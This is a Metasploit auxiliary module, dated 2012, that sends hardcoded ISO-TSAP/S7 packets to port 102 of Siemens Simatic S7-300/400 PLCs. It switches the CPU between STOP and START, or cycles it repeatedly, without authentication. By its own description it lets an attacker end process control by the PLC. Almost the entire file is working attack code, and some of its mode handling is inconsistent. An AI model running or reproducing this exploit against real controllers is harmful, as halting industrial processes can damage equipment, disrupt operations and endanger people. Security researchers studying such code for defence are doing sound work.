# Exploit Title: Siemens Simatic S7 300/400 CPU command module
# Date: 7-13-2012
# Exploit Author: Dillon Beresford
# Vendor Homepage: http://www.siemens.com/
# Tested on: Siemens Simatic S7-300 PLC
# CVE : None

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	
	include Msf::Exploit::Remote::Tcp
	include Rex::Socket::Tcp
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
		  'Name'=> 'Siemens Simatic S7-300/400 CPU START/STOP Module',
		  'Description'   => %q{
				The Siemens Simatic S7-300/400 S7 CPU start and stop functions over ISO-TSAP
				this modules allows an attacker to perform administrative commands without authentication.
				This module allows a remote user to change the state of the PLC between
				STOP and START, allowing an attacker to end process control by the PLC.
			},
		  'Author'			=> 'Dillon Beresford',
		  'License'     			=> MSF_LICENSE,
		  'References'     =>
				[
					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-186-01.pdf' ],
					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-161-01.pdf' ],
				],
			'Version'        => '$Revision$',
		  'DisclosureDate' => 'May 09 2011'
		  ))
		  
		  register_options(
			  [
				  Opt::RPORT(102),
				  OptInt.new('MODE', [false, 'Set true to put the CPU back into RUN mode.',false]),
				  OptInt.new('CYCLES',[true,"Set the amount of CPU STOP/RUN cycles.",10])
		    ], self.class)
		end
    
    def run_host(ip)
		begin
		
		cpu = datastore['MODE'] || ''
		cycles = datastore['CYCLES'] || ''
				
		stop_cpu_pkt = 
		  [
		    	       "\x03\x00\x00\x16\x11\xe0\x00\x00"+ 
		               "\x00\x01\x00\xc1\x02\x01\x00\xc2"+ 
			       "\x02\x01\x02\xc0\x01\x09",

				"\x03\x00\x00\x19\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\xff\xff\x00\x08\x00"+ 
				"\x00\xf0\x00\x00\x01\x00\x01\x03"+ 
				"\xc0",

				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x00\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x40\x00\x01\x84\x00\x00\x00",

				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",

				"\x03\x00\x00\x21\x02\xf0\x80\x32"+
				"\x01\x00\x00\x00\x02\x00\x10\x00"+ 
				"\x00\x29\x00\x00\x00\x00\x00\x09"+ 
				"\x50\x5f\x50\x52\x4f\x47\x52\x41"+ 
				"\x4d",
				
				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",
				
				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",
				
				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",
				
			  	"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",
				
				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",
				
				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",
				
				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",
				
				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00"
		  ]
		
		start_cpu_pkt = 
		  [
		   	        "\x03\x00\x00\x16\x11\xe0\x00\x00"+ 
				"\x00\x01\x00\xc1\x02\x01\x00\xc2"+ 
				"\x02\x01\x02\xc0\x01\x09",

				"\x03\x00\x00\x19\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\xff\xff\x00\x08\x00"+ 
				"\x00\xf0\x00\x00\x01\x00\x01\x03"+ 
				"\xc0",

				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x00\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x40\x00\x01\x84\x00\x00\x00",

				"\x03\x00\x00\x1f\x02\xf0\x80\x32"+ 
				"\x01\x00\x00\x00\x01\x00\x0e\x00"+ 
				"\x00\x04\x01\x12\x0a\x10\x02\x00"+ 
				"\x10\x00\x00\x83\x00\x00\x00",


				"\x03\x00\x00\x25\x02\xf0\x80\x32"+  
				"\x01\x00\x00\x00\x02\x00\x14\x00"+ 
				"\x00\x28\x00\x00\x00\x00\x00\x00"+ 
				"\xfd\x00\x00\x09\x50\x5f\x50\x52"+
				"\x4f\x47\x52\x41\x4d"
				
				]
		# CPU STOP		
		if(cpu == 1)
		connect()
		stop_cpu_pkt.each do |i|
		  sock.put("#{i}")
		  sleep(0.005)
		  end
	  end
	  # CPU START
	  if(cpu == 2)
		connect()
		start_cpu_pkt.each do |i|
		  sock.put("#{i}")
		  sleep(0.005)
		  end
	  end
	# STOP / START CPU 
	for n in 0..cycles
	  if(cpu == 3)
		connect()
		# We assume PLC is up and running (issue a stop command)
		stop_cpu_pkt.each do |i|  
		  sock.put("#{i}")
		  sleep(0.005)
		end
		
		connect()
		# We assume PLC is has been stopped (issue a start command)
	  start_cpu_pkt.each do |i|
	    sock.put("#{i}")
		  sleep(0.005)
		  end
	  end
  end
  
	data = sock.get_once()  
		print_good("#{ip} PLC is running, iso-tsap port is open.")
	if(cpu == 'true')
		print_status("Putting the PLC into START mode.")
			elsif(cpu == 'false')
				print_status("Putting the PLC into STOP mode.")
			end
			disconnect()
			rescue ::EOFError
		end
	end
end



